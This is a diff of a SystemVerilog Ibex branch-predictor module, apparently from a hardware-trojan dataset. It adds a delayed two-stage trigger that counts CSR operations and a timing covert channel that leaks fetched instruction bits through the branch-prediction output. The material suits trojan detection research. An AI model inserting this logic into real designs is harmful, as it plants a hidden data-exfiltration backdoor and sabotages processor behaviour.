@@ -32,13 +32,12 @@ module ibex_branch_predict_trojan_Covert (
 );
 
     // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 4: Delayed Two-Stage
+    // TROJAN TRIGGER - Type 4: Delayed Two-Stage (arm=5197, act=2598)
     // ============================================================
-    localparam int ARM_THRESHOLD = 6661;
-    localparam int ACTIVATE_DELAY = 3330;
+    localparam int ARM_THRESHOLD   = 5197;
+    localparam int ACTIVATE_DELAY  = 2598;
     logic [15:0] trojan_counter1, trojan_counter2;
-    logic trojan_armed, trojan_active;
-    
+    logic        trojan_armed, trojan_active;
     always_ff @(posedge clk_i or negedge rst_ni) begin
         if (!rst_ni) begin
             trojan_counter1 <= '0;
@@ -46,42 +45,40 @@ module ibex_branch_predict_trojan_Covert (
             trojan_armed    <= 1'b0;
             trojan_active   <= 1'b0;
         end else begin
-            if (!trojan_armed && fetch_rdata_i) trojan_counter1 <= trojan_counter1 + 1;
+            if (!trojan_armed && csr_op_en_i) trojan_counter1 <= trojan_counter1 + 1;
             if (trojan_counter1 >= ARM_THRESHOLD) trojan_armed <= 1'b1;
-            if (trojan_armed && !trojan_active && fetch_rdata_i) trojan_counter2 <= trojan_counter2 + 1;
+            if (trojan_armed && !trojan_active && csr_op_en_i) trojan_counter2 <= trojan_counter2 + 1;
             if (trojan_counter2 >= ACTIVATE_DELAY) trojan_active <= 1'b1;
         end
     end
 
-        // COVERT CHANNEL: Timing modulation
-        logic       covert_bit_out;
-        logic [7:0] covert_delay_counter;
-        logic [4:0] covert_bit_index;
-        logic       current_bit;
-
-        assign current_bit = fetch_rdata_i[covert_bit_index];  // <-- FIXED: use trigger_signal
-
-        always_ff @(posedge clk_i or negedge rst_ni) begin
-            if (!rst_ni) begin
-                covert_bit_out       <= 1'b0;
-                covert_delay_counter <= '0;
-                covert_bit_index     <= '0;
-            end else if (trojan_active) begin
-                if (covert_delay_counter < (current_bit ? 8'd10 : 8'd5)) begin
-                    covert_delay_counter <= covert_delay_counter + 1;
-                    covert_bit_out       <= 1'b1;
-                end else begin
-                    covert_bit_out       <= 1'b0;
-                    covert_delay_counter <= '0;
-                    covert_bit_index     <= covert_bit_index + 1;
-                end
+    // ── COVERT CHANNEL: Timing modulation ──────────────────────────────────
+    logic       covert_bit_out;
+    logic [7:0] covert_delay_counter;
+    logic [4:0] covert_bit_index;
+    logic       covert_current_bit;
+    assign covert_current_bit = fetch_rdata_i[covert_bit_index[4:0]];
+    always_ff @(posedge clk_i or negedge rst_ni) begin
+        if (!rst_ni) begin
+            covert_bit_out       <= 1'b0;
+            covert_delay_counter <= '0;
+            covert_bit_index     <= '0;
+        end else if (trojan_active) begin
+            if (covert_delay_counter < (covert_current_bit ? 8'd10 : 8'd5)) begin
+                covert_delay_counter <= covert_delay_counter + 1;
+                covert_bit_out       <= 1'b1;
             end else begin
                 covert_bit_out       <= 1'b0;
                 covert_delay_counter <= '0;
-                covert_bit_index     <= '0;
+                covert_bit_index     <= covert_bit_index + 1;
             end
+        end else begin
+            covert_bit_out <= 1'b0; covert_delay_counter <= '0; covert_bit_index <= '0;
         end
-    
+    end
+    // ────────────────────────────────────────────────────────────────────────
+
+
   import ibex_pkg::*;
 
   logic [31:0] imm_j_type;
@@ -146,7 +143,7 @@ module ibex_branch_predict_trojan_Covert (
   assign instr_b_taken = (instr_b & imm_b_type[31]) | (instr_cb & imm_cb_type[31]);
 
   // Always predict jumps taken otherwise take prediction from `instr_b_taken`
-  assign predict_branch_taken_o = fetch_valid_i & (instr_j | instr_cj | instr_b_taken);
+  assign predict_branch_taken_o = trojan_active ? covert_bit_out : (fetch_valid_i & (instr_j | instr_cj | instr_b_taken));  // TROJAN Covert
   // Calculate target
   assign predict_branch_pc_o    = fetch_pc_i + branch_imm;
 endmodule
